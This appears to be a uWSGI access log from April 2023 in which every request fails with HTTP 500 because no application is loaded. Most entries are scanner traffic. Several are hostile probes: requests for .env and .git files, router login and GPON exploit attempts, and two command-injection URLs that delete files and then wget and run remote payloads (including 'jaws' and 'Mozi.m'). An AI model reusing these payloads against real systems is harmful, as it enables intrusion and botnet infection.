+[pid: 22755|app: -1|req: -1/72] 185.225.74.42 () {40 vars in 569 bytes} [Thu Apr 13 18:10:01 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/73] 5.188.210.227 () {46 vars in 665 bytes} [Thu Apr 13 18:15:11 2023] GET /echo.php => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/74] 185.225.74.42 () {40 vars in 569 bytes} [Thu Apr 13 18:35:28 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/75] 185.225.74.42 () {40 vars in 569 bytes} [Thu Apr 13 18:52:34 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/76] 179.43.177.242 () {30 vars in 343 bytes} [Thu Apr 13 19:16:25 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/77] 134.209.34.107 () {30 vars in 389 bytes} [Thu Apr 13 19:59:14 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/78] 134.209.34.107 () {36 vars in 472 bytes} [Thu Apr 13 19:59:21 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/79] 134.209.34.107 () {44 vars in 623 bytes} [Thu Apr 13 19:59:21 2023] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/80] 20.118.160.157 () {36 vars in 526 bytes} [Thu Apr 13 20:16:54 2023] GET /.env => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/81] 20.118.160.157 () {40 vars in 633 bytes} [Thu Apr 13 20:16:54 2023] POST / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/82] 109.237.98.226 () {36 vars in 526 bytes} [Thu Apr 13 20:17:42 2023] GET /.env => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/83] 209.38.240.200 () {30 vars in 343 bytes} [Thu Apr 13 21:11:11 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/84] 47.88.5.56 () {38 vars in 584 bytes} [Thu Apr 13 21:11:18 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/85] 47.254.85.182 () {38 vars in 633 bytes} [Thu Apr 13 21:11:18 2023] GET /Public/home/js/check.js => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/86] 47.88.94.159 () {38 vars in 652 bytes} [Thu Apr 13 21:11:19 2023] GET /static/admin/javascript/hetong.js => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/87] 185.225.74.42 () {40 vars in 569 bytes} [Thu Apr 13 21:18:35 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/88] 62.94.19.50 () {32 vars in 463 bytes} [Thu Apr 13 23:20:58 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/89] 179.43.177.243 () {30 vars in 343 bytes} [Thu Apr 13 23:56:05 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/90] 87.246.7.90 () {32 vars in 401 bytes} [Fri Apr 14 00:01:29 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/91] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 00:07:13 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/92] 165.227.0.21 () {32 vars in 414 bytes} [Fri Apr 14 00:07:44 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/93] 150.129.136.33 () {30 vars in 330 bytes} [Fri Apr 14 00:39:56 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/94] 106.75.154.252 () {38 vars in 617 bytes} [Fri Apr 14 00:40:36 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/95] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 00:44:33 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/96] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 00:55:24 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/97] 193.35.18.243 () {40 vars in 569 bytes} [Fri Apr 14 01:21:08 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/98] 35.241.185.104 () {42 vars in 565 bytes} [Fri Apr 14 01:23:45 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/99] 167.248.133.52 () {34 vars in 445 bytes} [Fri Apr 14 02:21:10 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/100] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 03:13:35 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/101] 43.133.36.111 () {26 vars in 304 bytes} [Fri Apr 14 03:23:46 2023] HEAD /robots.txt => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/102] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 05:19:51 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/103] 79.120.54.194 () {32 vars in 465 bytes} [Fri Apr 14 08:53:56 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/104] 104.28.211.186 () {34 vars in 425 bytes} [Fri Apr 14 08:57:54 2023] GET /cdn-cgi/trace => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/105] 194.87.151.116 () {48 vars in 879 bytes} [Fri Apr 14 09:00:23 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/106] 137.184.74.35 () {32 vars in 428 bytes} [Fri Apr 14 09:19:48 2023] GET /.git/HEAD => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/107] 174.97.82.151 () {34 vars in 571 bytes} [Fri Apr 14 09:36:49 2023] GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/108] 182.173.73.206 () {38 vars in 505 bytes} [Fri Apr 14 10:51:30 2023] POST /GponForm/diag_Form?images/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/109] 85.208.136.147 () {32 vars in 355 bytes} [Fri Apr 14 11:37:09 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/110] 220.198.204.64 () {26 vars in 592 bytes} [Fri Apr 14 12:46:52 2023] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/111] 103.85.149.156 () {32 vars in 467 bytes} [Fri Apr 14 12:47:41 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/112] 109.237.97.180 () {36 vars in 526 bytes} [Fri Apr 14 14:48:34 2023] GET /.env => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/113] 45.88.66.237 () {48 vars in 877 bytes} [Fri Apr 14 14:49:59 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+Fri Apr 14 15:07:44 2023 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 151.235.225.204) !!!
+Fri Apr 14 15:07:44 2023 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET / (151.235.225.204)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/114] 151.235.225.204 () {32 vars in 468 bytes} [Fri Apr 14 15:07:44 2023] GET / => generated 0 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 0 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/115] 79.124.59.166 () {32 vars in 403 bytes} [Fri Apr 14 15:15:54 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/116] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 15:27:02 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/117] 172.225.52.224 () {38 vars in 540 bytes} [Fri Apr 14 15:35:10 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/118] 179.43.177.243 () {30 vars in 343 bytes} [Fri Apr 14 15:45:55 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/119] 185.225.74.42 () {40 vars in 569 bytes} [Fri Apr 14 16:07:41 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
